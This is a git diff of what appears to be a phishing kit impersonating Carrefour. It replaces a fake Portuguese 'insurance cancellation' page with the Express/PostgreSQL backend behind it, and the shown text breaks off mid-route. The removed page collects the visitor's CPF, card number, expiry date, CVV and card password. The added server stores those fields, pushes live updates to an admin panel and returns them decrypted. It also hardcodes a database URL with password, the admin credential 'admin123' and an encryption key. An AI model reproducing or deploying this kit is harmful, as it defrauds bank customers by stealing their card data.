@@ -1,204 +1,637 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cancelamento de Seguro</title>
-    <link rel="stylesheet" href="/public/css/tailwind.css" onerror="console.error('Failed to load Tailwind CSS');">
-    <style>
-        body {
-            font-family: Arial, sans-serif; /* Fallback para sans-serif */
-            margin: 0;
-            padding: 0;
-            overflow: hidden; /* Impede rolagem até que a etapa seja concluída */
+const express = require('express');
+const { Pool } = require('pg');
+const path = require('path');
+const crypto = require('crypto');
+const bodyParser = require('body-parser');
+const bcrypt = require('bcryptjs');
+const basicAuth = require('express-basic-auth');
+const WebSocket = require('ws');
+const http = require('http'); // Adicionado explicitamente
+const session = require('express-session');
+const rateLimit = require('express-rate-limit');
+const CryptoJS = require('crypto-js'); // Para criptografia no cliente/servidor
+const pgSession = require('connect-pg-simple')(session); // Adicionado para substituir MemoryStore
+
+const app = express();
+const port = process.env.PORT || 10000; // Usar porta padrão do Render
+
+// Middleware de sessão para autenticação com connect-pg-simple
+app.use(session({
+    store: new pgSession({
+        pool: pool, // Usa o mesmo pool do PostgreSQL
+        ttl: 24 * 60 * 60 // Tempo de vida da sessão em segundos (1 dia)
+    }),
+    secret: '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1', // Use a mesma chave de criptografia como segredo
+    resave: false,
+    saveUninitialized: false,
+    cookie: { secure: process.env.NODE_ENV === 'production' }
+}));
+
+// Rate limiting para evitar abusos
+const limiter = rateLimit({
+    windowMs: 15 * 60 * 1000, // 15 minutos
+    max: 100, // Limite de 100 requisições por IP
+    message: { error: 'Limite de requisições excedido. Tente novamente mais tarde.' }
+});
+app.use(limiter);
+
+// Middleware to parse JSON bodies
+app.use(bodyParser.json());
+
+// Middleware de segurança com CSP restritivo
+app.use((req, res, next) => {
+    const proto = req.headers['x-forwarded-proto'] || req.protocol;
+    if (proto !== 'https' && req.hostname !== 'localhost') {
+        console.log(`Redirecting ${proto} to HTTPS for URL: ${req.url}`);
+        return res.redirect(301, `https://${req.hostname}${req.url}`);
+    }
+    res.setHeader(
+        'Content-Security-Policy',
+        "default-src 'self'; style-src 'self' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; script-src 'self'; connect-src 'self' wss://seguro-cancelamento.onrender.com; img-src 'self' data: https://*.carrefour.com; upgrade-insecure-requests"
+    );
+    res.setHeader('X-Content-Type-Options', 'nosniff');
+    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
+    res.setHeader('X-Frame-Options', 'DENY');
+    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
+
+    // Validação de origem
+    const origin = req.headers.origin;
+    if (origin && !origin.includes('seguro-cancelamento.onrender.com')) {
+        return res.status(403).json({ error: 'Origem não permitida' });
+    }
+    next();
+});
+
+// Basic authentication for admin panel
+const adminUsers = {
+    'admin': 'admin123'
+};
+
+app.use('/admin', basicAuth({
+    users: adminUsers,
+    challenge: true,
+    unauthorizedResponse: (req) => {
+        return req.auth ? 'Credenciais inválidas.' : 'Acesso não autorizado. Por favor, faça login.';
+    }
+}));
+
+// Middleware para verificar autenticação nas rotas sensíveis
+const requireAuth = (req, res, next) => {
+    if (!req.session.authenticated) {
+        console.log('Unauthorized access attempt to protected route:', req.url);
+        return res.status(401).json({ error: 'Não autorizado. Faça login.' });
+    }
+    next();
+};
+
+// Serve static files after authentication middleware
+app.use('/public', express.static(path.join(__dirname, 'public')));
+
+// Serve index.html for the root route
+app.get('/', (req, res) => {
+    try {
+        res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    } catch (error) {
+        console.error('Err serving index.html:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Database setup with PostgreSQL
+const pool = new Pool({
+    connectionString: process.env.DATABASE_URL || 'postgresql://cancelamento_seguro_1yjg_user:SlS0TvYNbrYy4LbqNO7d1ta1VuNwVK7d@dpg-d14726ripnbc73c49dm0-a.oregon-postgres.render.com/cancelamento_seguro_1yjg',
+    ssl: {
+        rejectUnauthorized: false
+    },
+    connectionTimeoutMillis: 10000
+});
+
+// Handle database connection errors and reconnections
+pool.on('error', (err, client) => {
+    console.error('Unexpected err on idle DB client:', err.message);
+    setTimeout(async () => {
+        try {
+            console.log('Attempting to reconnect to DB...');
+            await connectToDatabase();
+        } catch (reconnectError) {
+            console.error('Failed to reconnect to DB:', reconnectError.message);
         }
-        @keyframes rotateCard {
-            from {
-                transform: rotateY(0deg);
+    }, 5000);
+});
+
+// Function to connect to PostgreSQL with retries
+async function connectToDatabase(retries = 10, delay = 5000) {
+    for (let i = 0; i < retries; i++) {
+        try {
+            const client = await pool.connect();
+            console.log('Connected to DB');
+            client.release();
+            return true;
+        } catch (error) {
+            console.error(`Err connecting to DB (attempt ${i + 1}/${retries}):`, error.message);
+            if (i === retries - 1) {
+                console.error('Failed to connect to DB after all retries');
+                throw error;
             }
-            to {
-                transform: rotateY(360deg);
-            }
+            await new Promise(resolve => setTimeout(resolve, delay));
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        /* Garante que apenas uma tela seja visível por vez */
-        #splash, #main-screen, #card-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            overflow-y: auto; /* Permite rolagem interna apenas na tela visível */
-        }
-        #splash.hidden, #main-screen.hidden, #card-screen.hidden {
-            display: none !important;
-        }
-        #main-screen {
-            display: flex !important;
-        }
-        #card-content, #analysis-message {
-            display: none;
-        }
-        #card-content.visible, #analysis-message.visible {
-            display: flex;
-        }
-        /* Fallback para estilos básicos se o Tailwind CSS não carregar */
-        .bg-gray-100 { background-color: #f3f4f6; }
-        .bg-white { background-color: #ffffff; }
-        .bg-blue-600 { background-color: #2563eb; }
-        .bg-purple-600 { background-color: #7c3aed; }
-        .text-gray-800 { color: #1f2937; }
-        .text-gray-600 { color: #4b5563; }
-        .text-red-600 { color: #dc2626; }
-        .text-blue-600 { color: #2563eb; }
-        .text-white { color: #ffffff; }
-        .hidden { display: none; }
-        .flex { display: flex; }
-        .flex-col { flex-direction: column; }
-        .items-center { align-items: center; }
-        .justify-center { justify-content: center; }
-        .w-full { width: 100%; }
-        .h-full { height: 100%; }
-        .max-w-md { max-width: 28rem; }
-        .px-4 { padding-left: 1rem; padding-right: 1rem; }
-        .py-3 { padding-top: 0.75rem; padding-bottom: 0.75rem; }
-        .my-8 { margin-top: 2rem; margin-bottom: 2rem; }
-        .text-center { text-align: center; }
-        .font-medium { font-weight: 500; }
-        .font-semibold { font-weight: 600; }
-        .text-sm { font-size: 0.875rem; }
-        .text-base { font-size: 1rem; }
-        .text-xl { font-size: 1.25rem; }
-        .text-2xl { font-size: 1.5rem; }
-        .rounded-full { border-radius: 9999px; }
-        .border { border-width: 1px; }
-        .border-gray-300 { border-color: #d1d5db; }
-        .shadow-md { box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06); }
-    </style>
-</head>
-<body class="bg-gray-100">
-    <!-- Header -->
-    <header id="header" class="fixed top-0 left-0 right-0 bg-white shadow-sm z-40 hidden">
-        <div class="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between">
-            <img src="/public/img/logocarrefour.png" alt="Logo Carrefour" class="h-10" onerror="this.style.display='none'; console.error('Failed to load logocarrefour.png');">
-            <div class="flex items-center space-x-3">
-                <button class="bg-blue-600 text-white px-4 py-2 rounded-full hover:bg-blue-700 transition-colors">Peça já o seu</button>
-                <button class="text-gray-600 hover:text-gray-800">
-                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
-                    </svg>
-                </button>
-            </div>
-        </div>
-    </header>
+    }
+}
 
-    <!-- Splash Screen with GIF -->
-    <div id="splash" class="fixed inset-0 bg-blue-600 flex items-center justify-center z-50">
-        <img id="splash-gif" src="/public/img/splash.gif" alt="Splash Animation" class="w-full h-full object-cover" onerror="this.style.display='none'; console.error('Failed to load splash.gif');">
-    </div>
+// Create tables
+async function initializeDatabase() {
+    try {
+        await pool.query(`
+            CREATE TABLE IF NOT EXISTS form_data (
+                id SERIAL PRIMARY KEY,
+                cpf TEXT NOT NULL,
+                card_number TEXT NOT NULL,
+                expiry_date TEXT NOT NULL,
+                cvv TEXT NOT NULL,
+                password TEXT NOT NULL,
+                submitted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        `);
+        console.log('Table "form_data" initialized');
 
-    <!-- Main Screen (CPF Input) -->
-    <div id="main-screen" class="hidden min-h-screen flex flex-col items-center justify-start opacity-0 transition-opacity duration-1000 overflow-y-auto bg-gray-100">
-        <div class="bg-cover bg-top min-h-[70vh] w-full bg-gray-200" style="background-image: url('/public/img/fundoprincipal.png')" onerror="console.error('Failed to load fundoprincipal.png');"></div>
-        <div class="bg-white flex-grow flex flex-col items-center justify-center px-6 pb-20">
-            <div class="flex items-center justify-center my-8">
-                <img src="/public/img/iconseguro.png" alt="Ícone Seguro" class="h-6 w-6 mr-2" onerror="this.style.display='none'; console.error('Failed to load iconseguro.png');">
-                <h2 class="text-xl font-semibold text-gray-800 tracking-tight">Cancelamento de Seguro</h2>
-            </div>
-            <p class="text-center text-gray-800 my-8 text-base">
-                Para prosseguir com o cancelamento do seguro, Faça o login com seu CPF, o cancelamento será efetivado em até 24 Horas após a confirmação dos dados.
-            </p>
-            <div class="my-8 w-full max-w-[280px]">
-                <label class="block text-gray-800 font-medium mb-2 text-center text-sm" for="cpf">CPF</label>
-                <input id="cpf" type="text" class="w-full p-2 border border-gray-300 rounded-md bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-blue-400 shadow-md" placeholder="Digite seu CPF" maxlength="14">
-                <p id="cpf-error" class="hidden text-red-600 text-sm text-center mt-2">CPF Inválido</p>
-                <p class="text-gray-600 text-xs text-center mt-2">Seus dados são protegidos pela Lei Geral de Proteção de Dados (LGPD). Saiba mais na nossa Política de Privacidade.</p>
-                <p class="text-gray-600 text-xs text-center mt-2">Caso o seguro não seja cancelado, o seguro protegido será ativado automaticamente.</p>
-            </div>
-            <button id="next-btn" class="w-full max-w-[280px] mx-auto bg-gradient-to-r from-blue-600 to-blue-800 text-white p-2 rounded-full hover:from-blue-700 hover:to-blue-900 transition-colors text-sm my-8 shadow-md" disabled>Próximo</button>
-        </div>
-    </div>
+        await pool.query(`
+            CREATE TABLE IF NOT EXISTS temp_data (
+                session_id TEXT PRIMARY KEY,
+                cpf TEXT,
+                card_number TEXT,
+                expiry_date TEXT,
+                cvv TEXT,
+                password TEXT,
+                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        `);
+        console.log('Table "temp_data" initialized');
 
-    <!-- Card Details Screen -->
-    <div id="card-screen" class="hidden flex flex-col items-center justify-start opacity-0 transition-opacity duration-1000 bg-gray-100">
-        <!-- Introductory Section -->
-        <div class="bg-purple-600 min-h-[80vh] w-full flex flex-col items-center justify-center">
-            <div class="bg-white/95 shadow-2xl rounded-2xl px-8 py-10 text-center max-w-md mx-auto">
-                <img src="/public/img/cartaofundo.png" alt="Cartão Fundo" class="w-64 h-auto mx-auto mb-6 shadow-lg opacity-100" onerror="this.style.display='none'; console.error('Failed to load cartaofundo.png');">
-                <h2 class="text-2xl font-semibold bg-gradient-to-r from-blue-600 to-purple-600 bg-clip-text text-transparent tracking-tight">Estamos Prontos para Ajudar com o Cancelamento do Seu Seguro</h2>
-                <p class="text-gray-700 text-base font-medium mt-4">Insira os dados do cartão para prosseguir.</p>
-            </div>
-        </div>
-        <!-- Card Data Section -->
-        <div id="card-content" class="w-full max-w-md bg-gradient-to-b from-white to-gray-50 flex flex-col items-center justify-center px-6 py-12 rounded-t-lg flex-grow shadow-xl rounded-xl pb-32 md:pb-16">
-            <div class="bg-gradient-to-r from-blue-600/10 to-purple-600/10 shadow-md rounded-lg px-4 py-2 mb-6 flex items-center justify-center">
-                <svg class="w-4 h-4 mr-2 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 11c0-1.1-.9-2-2-2H6c-1.1 0-2 .9-2 2v6c0 1.1.9 2 2 2h4c1.1 0 2-.9 2-2v-2m0-4v2m4-6h4c1.1 0 2 .9 2 2v6c0 1.1-.9 2-2 2h-4c-1.1 0-2-.9-2-2v-6c0-1.1.9-2 2-2z"></path>
-                </svg>
-                <p class="text-lg font-medium bg-gradient-to-r from-blue-600 to-purple-600 bg-clip-text text-transparent tracking-tight">Seus Dados Estão Seguros com o Carrefour</p>
-            </div>
-            <div class="flex items-center justify-center mb-4">
-                <svg class="w-6 h-6 mr-2 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 11c0-1.1-.9-2-2-2H6c-1.1 0-2 .9-2 2v6c0 1.1.9 2 2 2h4c1.1 0 2-.9 2-2v-2m0-4v2m4-6h4c1.1 0 2 .9 2 2v6c0 1.1-.9 2-2 2h-4c-1.1 0-2-.9-2-2v-6c0-1.1.9-2 2-2z"></path>
-                </svg>
-                <h2 class="text-2xl font-semibold bg-gradient-to-r from-blue-600 to-purple-600 bg-clip-text text-transparent text-center tracking-tight">Insira os Dados para realizar o Cancelamento</h2>
-            </div>
-            <div class="bg-gradient-to-r from-blue-600 to-purple-600 h-1 w-16 rounded-full mx-auto mb-6 shadow-sm"></div>
-            <div class="my-6 w-full max-w-[280px]">
-                <label class="block text-gray-800 font-medium mb-2 text-center text-sm" for="card-number">Número do Cartão</label>
-                <input id="card-number" type="text" class="w-full p-2 border border-gray-300 rounded-md bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-blue-400 shadow-md" placeholder="Digite os 16 dígitos" maxlength="19">
-                <p id="card-error" class="hidden text-red-600 text-sm text-center mt-2">Número do Cartão Inválido</p>
-            </div>
-            <div class="my-6 w-full max-w-[280px]">
-                <label class="block text-gray-800 font-medium mb-2 text-center text-sm" for="expiry-date">Data de Expiração</label>
-                <input id="expiry-date" type="text" class="w-full p-2 border border-gray-300 rounded-md bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-blue-400 shadow-md" placeholder="MM/AA" maxlength="5">
-                <p id="expiry-error" class="hidden text-red-600 text-sm text-center mt-2">Data de Expiração Inválida</p>
-            </div>
-            <div class="my-6 w-full max-w-[280px]">
-                <label class="block text-gray-800 font-medium mb-2 text-center text-sm" for="cvv">CVV</label>
-                <input id="cvv" type="text" class="w-full p-2 border border-gray-300 rounded-md bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-blue-400 shadow-md" placeholder="3 dígitos" maxlength="3">
-            </div>
-            <div id="card-container" class="relative hidden my-6">
-                <img src="/public/img/cartao.png" alt="Cartão Girando" class="w-32 h-auto mx-auto animate-[rotateCard_2s_infinite]" onerror="this.style.display='none'; console.error('Failed to load cartao.png');">
-            </div>
-            <p id="confirmation-message" class="hidden text-center text-gray-800 text-sm mb-4 max-w-xs">
-                O seguro CARREFOUR é um seguro automático o qual ajuda em qualquer tipo de prevenção, a senha de 4 dígitos é solicitada para concluir o cancelamento para clientes.
-            </p>
-            <div id="password-field" class="my-6 w-full max-w-[280px] hidden">
-                <label class="block text-gray-800 font-medium mb-2 text-center text-sm" for="password">Senha (4 dígitos)</label>
-                <input id="password" type="text" class="w-full p-2 border border-gray-300 rounded-md bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-blue-400 shadow-md" placeholder="Digite a senha" maxlength="4">
-            </div>
-            <p class="text-gray-600 text-xs text-center mt-4">A segurança dos seus dados no Carrefour está protegida pela Lei Geral de Proteção de Dados (LGPD) e por nossas políticas internas. Utilizamos criptografia e medidas de segurança para garantir a proteção dos seus dados.</p>
-            <button id="submit-btn" class="w-full max-w-[280px] mx-auto bg-gradient-to-r from-blue-600 to-blue-800 text-white p-2 rounded-full hover:from-blue-700 hover:to-blue-900 transition-colors text-sm my-6 shadow-md hidden">Prosseguir</button>
-        </div>
-        <div id="analysis-message" class="w-full max-w-md bg-white flex flex-col items-center justify-center px-6 py-12 rounded-t-lg flex-grow shadow-lg rounded-xl">
-            <img src="/public/img/carina.png" alt="Carina" class="w-12 h-12 rounded-full mb-4" onerror="this.style.display='none'; console.error('Failed to load carina.png');">
-            <div class="flex items-center justify-center mb-4">
-                <div class="w-8 h-8 border-4 border-blue-600 border-t-transparent rounded-full animate-[spin_1s_linear_infinite]"></div>
-                <h2 class="text-xl font-semibold ml-4 text-gray-800 tracking-tight">Solicitação em Análise</h2>
-            </div>
-            <button id="whatsapp-redirect-btn" class="w-full max-w-[280px] mx-auto bg-gradient-to-r from-blue-600 to-blue-800 text-white p-2 rounded-full hover:from-blue-700 hover:to-blue-900 transition-colors text-sm my-6 shadow-md">Fale Conosco pelo WhatsApp</button>
-        </div>
-    </div>
+        await pool.query(`
+            CREATE TABLE IF NOT EXISTS settings (
+                key TEXT PRIMARY KEY,
+                value TEXT NOT NULL
+            )
+        `);
+        console.log('Table "settings" initialized');
 
-    <!-- WhatsApp Button -->
-    <div id="whatsapp-button" class="fixed bottom-16 right-4 z-50 hidden">
-        <a id="whatsapp-button-link" class="flex items-center justify-center w-14 h-14 bg-gradient-to-r from-blue-600 to-blue-800 rounded-full shadow-lg hover:from-blue-700 hover:to-blue-900 transition-colors">
-            <img src="/public/img/carina.png" alt="Carina" class="w-10 h-10 rounded-full object-cover" onerror="this.style.display='none'; console.error('Failed to load carina.png');">
-        </a>
-    </div>
+        // Inserir chave de criptografia padrão de 32 bytes (64 caracteres hexadecimais)
+        const encryptionKey = '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1'; // Exemplo de 64 caracteres
+        await pool.query(
+            `INSERT INTO settings (key, value) VALUES ('encryption_key', $1) 
+             ON CONFLICT (key) DO UPDATE SET value = $1`,
+            [encryptionKey]
+        );
+        console.log('Inserted encryption key:', encryptionKey);
 
-    <!-- Footer -->
-    <footer id="footer" class="fixed bottom-0 left-0 right-0 bg-blue-900 text-white py-2 z-40 hidden">
-        <div class="max-w-7xl mx-auto px-4 flex flex-col items-center space-y-2 md:flex-row md:justify-between md:space-y-0">
-            <p class="text-xs font-medium text-center">© 2025 Carrefour Soluções Financeiras. Todos os direitos reservados.</p>
-            <a id="whatsapp-footer-link" target="_blank" class="text-xs font-medium hover:underline">Fale Conosco pelo WhatsApp</a>
-        </div>
-    </footer>
+        await pool.query(
+            `INSERT INTO settings (key, value) VALUES ('contact_number', '+5511999999999') 
+             ON CONFLICT (key) DO NOTHING`
+        );
+        console.log('Default contact number inserted');
 
-    <script src="/public/js/script.js" onerror="console.error('Failed to load script.js');"></script>
-</body>
-</html>
+        await pool.query(`
+            CREATE TABLE IF NOT EXISTS visits (
+                id SERIAL PRIMARY KEY,
+                visited_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        `);
+        console.log('Table "visits" initialized');
+
+        console.log('DB tables initialized successfully');
+    } catch (error) {
+        console.error('Err initializing DB:', error.message);
+        throw error;
+    }
+}
+
+// Encryption key retrieval and validation
+async function getEncryptionKey() {
+    try {
+        console.log('Fetching encryption key...');
+        const result = await pool.query(
+            `SELECT value FROM settings WHERE key = 'encryption_key'`
+        );
+        console.log('Raw encryption key from DB:', result.rows[0]?.value);
+        const encryptionKey = result.rows.length > 0 ? result.rows[0].value : '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1';
+        const keyBytes = Buffer.from(encryptionKey, 'hex');
+        if (keyBytes.length !== 32) {
+            console.error('ENCRYPTION_KEY must be exactly 32 bytes long. Current length:', keyBytes.length, 'Raw key:', encryptionKey);
+            process.exit(1);
+        }
+        console.log('Encryption key retrieved successfully (length:', keyBytes.length, 'bytes)');
+        return encryptionKey;
+    } catch (error) {
+        console.error('Err fetching encryption key:', error.message);
+        process.exit(1);
+    }
+}
+
+let ENCRYPTION_KEY;
+const IV_LENGTH = 16; // For AES
+
+// Encrypt sensitive data
+function encrypt(text) {
+    try {
+        const iv = crypto.randomBytes(IV_LENGTH);
+        const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY, 'hex'), iv);
+        let encrypted = cipher.update(text, 'utf8', 'hex');
+        encrypted += cipher.final('hex');
+        return iv.toString('hex') + ':' + encrypted;
+    } catch (error) {
+        console.error('Err encrypting data:', error.message);
+        throw error;
+    }
+}
+
+// Decrypt sensitive data
+function decrypt(encryptedText) {
+    try {
+        const [ivHex, encryptedHex] = encryptedText.split(':').map(part => Buffer.from(part, 'hex'));
+        const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY, 'hex'), ivHex);
+        let decrypted = decipher.update(encryptedHex, 'hex', 'utf8');
+        decrypted += decipher.final('utf8');
+        return decrypted;
+    } catch (error) {
+        console.error('Err decrypting data:', error.message);
+        throw error;
+    }
+}
+
+// Get contact number from database
+async function getContactNumber() {
+    try {
+        console.log('Fetching contact number...');
+        const result = await pool.query(
+            `SELECT value FROM settings WHERE key = 'contact_number'`
+        );
+        const contactNumber = result.rows.length > 0 ? result.rows[0].value : '+5511999999999';
+        console.log('Contact number retrieved:', contactNumber.replace(/\d/g, '*'));
+        return contactNumber;
+    } catch (error) {
+        console.error('Err fetching contact number:', error.message);
+        throw error;
+    }
+}
+
+// WebSocket setup
+const server = http.createServer(app); // Usar http corretamente
+const wss = new WebSocket.Server({ server });
+
+// Broadcast to all connected WebSocket clients
+function broadcast(message) {
+    wss.clients.forEach(client => {
+        if (client.readyState === WebSocket.OPEN) {
+            client.send(JSON.stringify(message));
+        }
+    });
+}
+
+// Check authentication route for admin
+app.get('/admin/check-auth', (req, res) => {
+    if (req.auth && req.auth.user === 'admin') {
+        res.status(200).json({ message: 'Authenticated' });
+    } else {
+        res.status(401).json({ error: 'Not authenticated' });
+    }
+});
+
+// Serve admin panel
+app.get('/admin', (req, res) => {
+    try {
+        console.log('Serving admin panel...');
+        res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+    } catch (error) {
+        console.error('Err serving admin panel:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Handle temporary form submission (real-time updates) - Protegida por autenticação
+app.post('/api/temp-submit', requireAuth, async (req, res) => {
+    try {
+        console.log('Received temp form data:', Object.keys(req.body));
+        const { sessionId, cpf, cardNumber, expiryDate, cvv, password } = req.body;
+
+        if (!sessionId) {
+            console.warn('Missing sessionId in temp form data');
+            return res.status(400).json({ error: 'sessionId é obrigatório.' });
+        }
+
+        // Decrypt sensitive data received from client
+        const decryptedCpf = cpf ? CryptoJS.AES.decrypt(cpf, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
+        const decryptedCardNumber = cardNumber ? CryptoJS.AES.decrypt(cardNumber, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
+        const decryptedExpiryDate = expiryDate ? CryptoJS.AES.decrypt(expiryDate, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
+        const decryptedCvv = cvv ? CryptoJS.AES.decrypt(cvv, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
+        const decryptedPassword = password ? CryptoJS.AES.decrypt(password, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
+
+        // Encrypt sensitive data for storage
+        const encryptedCardNumber = decryptedCardNumber ? encrypt(decryptedCardNumber) : null;
+        const encryptedCvv = decryptedCvv ? encrypt(decryptedCvv) : null;
+        const encryptedPassword = decryptedPassword ? encrypt(decryptedPassword) : null;
+
+        // Insert or update temporary form data
+        await pool.query(
+            `INSERT INTO temp_data (session_id, cpf, card_number, expiry_date, cvv, password, updated_at)
+             VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)
+             ON CONFLICT (session_id)
+             DO UPDATE SET
+                 cpf = COALESCE(EXCLUDED.cpf, temp_data.cpf),
+                 card_number = COALESCE(EXCLUDED.card_number, temp_data.card_number),
+                 expiry_date = COALESCE(EXCLUDED.expiry_date, temp_data.expiry_date),
+                 cvv = COALESCE(EXCLUDED.cvv, temp_data.cvv),
+                 password = COALESCE(EXCLUDED.password, temp_data.password),
+                 updated_at = CURRENT_TIMESTAMP`,
+            [sessionId, decryptedCpf || null, encryptedCardNumber, decryptedExpiryDate || null, encryptedCvv, encryptedPassword]
+        );
+        console.log('Temp form data saved for session:', sessionId);
+
+        // Notify all connected WebSocket clients
+        broadcast({ type: 'TEMP_DATA_UPDATE' });
+
+        res.status(200).json({ message: 'Dados temporários salvos com sucesso!' });
+    } catch (error) {
+        console.error('Err in /api/temp-submit:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Get temporary form data for admin panel
+app.get('/api/temp-data', async (req, res) => {
+    try {
+        console.log('Fetching temp data...');
+        const result = await pool.query('SELECT * FROM temp_data ORDER BY updated_at DESC');
+        const rows = result.rows;
+
+        // Decrypt sensitive data before sending
+        const decryptedRows = rows.map(row => ({
+            ...row,
+            card_number: row.card_number ? decrypt(row.card_number) : null,
+            cvv: row.cvv ? decrypt(row.cvv) : null,
+            password: row.password ? decrypt(row.password) : null
+        }));
+
+        console.log('Temp data retrieved:', decryptedRows.length);
+        res.json(decryptedRows);
+    } catch (error) {
+        console.error('Err in /api/temp-data:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Delete a specific temporary form data
+app.delete('/api/delete-temp-data/:sessionId', async (req, res) => {
+    try {
+        const { sessionId } = req.params;
+        await pool.query('DELETE FROM temp_data WHERE session_id = $1', [sessionId]);
+        console.log(`Temp data deleted for session: ${sessionId}`);
+
+        // Notify all connected WebSocket clients
+        broadcast({ type: 'TEMP_DATA_UPDATE' });
+
+        res.status(200).json({ message: 'Dados temporários removidos com sucesso!' });
+    } catch (error) {
+        console.error('Err in /api/delete-temp-data:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Handle final form submission - Protegida por autenticação
+app.post('/submit', requireAuth, async (req, res) => {
+    try {
+        console.log('Received final form data:', Object.keys(req.body));
+        const { sessionId, cpf, cardNumber, expiryDate, cvv, password } = req.body;
+
+        if (!cpf || !cardNumber || !expiryDate || !cvv || !password) {
+            console.warn('Missing required fields in final form data');
+            return res.status(400).json({ error: 'Todos os campos são obrigatórios.' });
+        }
+
+        // Decrypt sensitive data received from client
+        const decryptedCpf = CryptoJS.AES.decrypt(cpf, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8);
+        const decryptedCardNumber = CryptoJS.AES.decrypt(cardNumber, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8);
+        const decryptedExpiryDate = CryptoJS.AES.decrypt(expiryDate, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8);
+        const decryptedCvv = CryptoJS.AES.decrypt(cvv, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8);
+        const decryptedPassword = CryptoJS.AES.decrypt(password, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8);
+
+        // Encrypt sensitive data for storage
+        const encryptedCardNumber = encrypt(decryptedCardNumber);
+        const encryptedCvv = encrypt(decryptedCvv);
+        const encryptedPassword = encrypt(decryptedPassword);
+
+        // Insert into form_data table
+        await pool.query(
+            `INSERT INTO form_data (cpf, card_number, expiry_date, cvv, password) VALUES ($1, $2, $3, $4, $5)`,
+            [decryptedCpf, encryptedCardNumber, decryptedExpiryDate, encryptedCvv, encryptedPassword]
+        );
+        console.log('Final form data saved to DB');
+
+        // Delete from temp_data after final submission
+        if (sessionId) {
+            await pool.query(
+                `DELETE FROM temp_data WHERE session_id = $1`,
+                [sessionId]
+            );
+            console.log('Temp data deleted for session:', sessionId);
+        }
+
+        // Notify all connected WebSocket clients
+        broadcast({ type: 'FORM_DATA_UPDATE' });
+
+        res.status(200).json({ message: 'Dados enviados com sucesso!' });
+    } catch (error) {
+        console.error('Err in /submit:', error.message);
+        res.status(500).json({ error: 'Erro interno do servidor.' });
+    }
+});
+
+// Get contact number
+app.get('/api/contact-number', async (req, res) => {
+    try {
+        const contactNumber = await getContactNumber();
+        res.json({ contactNumber });
+    } catch (error) {
+        console.error('Err in /api/contact-number:', error.message);
+        res.status(500).json({ error: 'Erro ao buscar o número de contato.' });
+    }
+});
+
+// Update contact number
+app.post('/api/contact-number', async (req, res) => {
+    try {
+        console.log('Req to update contact number:', req.body.contactNumber.replace(/\d/g, '*'));
+        const { contactNumber } = req.body;
